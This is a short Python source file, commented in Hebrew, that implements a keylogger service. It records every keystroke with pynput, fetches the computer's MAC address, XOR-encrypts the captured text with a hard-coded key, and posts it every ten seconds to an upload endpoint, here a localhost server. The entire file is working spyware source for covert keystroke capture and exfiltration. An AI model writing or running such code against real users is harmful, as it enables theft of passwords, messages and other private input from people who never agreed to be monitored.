from pynput import keyboard
import requests
import threading
import time
import encryptor
import os

# שירות ההאזנה להקלדות
class KeyLoggerService:
    def __init__(self):
        self.buffer = []
        self.ID_COMPUTER = os.popen("getmac /NH /FO CSV").read().split(",")[0].replace('"', '').strip()
        self.lock = threading.Lock()

    def on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            char = str(key)
        with self.lock:
            self.buffer.append(char)

    def get_buffer(self):
        with self.lock:
            data = ''.join(self.buffer)
            self.buffer.clear()
        return data

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# שליחת הנתונים לשרת
def send_to_server(encrypted_data, logger):
    url = "http://127.0.0.1:5000/api/upload"
    payload = {
        "keystrokes": encrypted_data,
        "mac_address": logger.ID_COMPUTER,
    }

    try:
        response = requests.post(url, json=payload)
        print("Server response:", response.json())
    except Exception as e:
        print("Failed to send data:", e)

# תהליך רקע לשליחה כל 10 שניות
def periodic_sender(logger, encryptor, interval=10):
    while True:
        time.sleep(interval)
        data = logger.get_buffer()
        if data:
            encrypted = encryptor.xor_encrypt(data)
            send_to_server(encrypted, logger)

# נקודת התחלה
if __name__ == "__main__":
    logger = KeyLoggerService()
    encryptor = encryptor.Encryptor("mysecretkey")

    sender_thread = threading.Thread(target=periodic_sender, args=(logger, encryptor), daemon=True)
    sender_thread.start()

    logger.start()